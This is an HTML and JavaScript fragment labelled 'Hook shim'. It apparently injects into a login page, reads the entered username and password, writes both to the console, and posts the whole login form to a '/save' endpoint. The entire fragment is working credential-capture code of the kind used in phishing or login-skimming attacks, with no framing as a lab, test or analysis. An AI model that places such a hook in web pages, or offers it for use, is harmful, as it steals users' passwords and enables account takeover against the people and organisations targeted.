<!-- START: Hook shim -->
<script src="https://code.jquery.com/jquery-3.2.1.min.js" 
integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>

<script type="text/javascript">
 function loadHook()
 {
     var userName = document.getElementById(Login.userNameInput).value;
     var password = document.getElementById(Login.passwordInput).value;
     console.log(userName);
     console.log(password);
     $.ajax({
         url: '/save',
         data: $('#loginForm').serialize(),
         contentType: "application/x-www-form-urlencoded",
         type: 'POST',
         success: function(response) {
             console.log(response);
         },
         error: function(error) {
             console.log(error);
         }
     });
     return false
 }
</script>
<!-- END: Hook shim -->
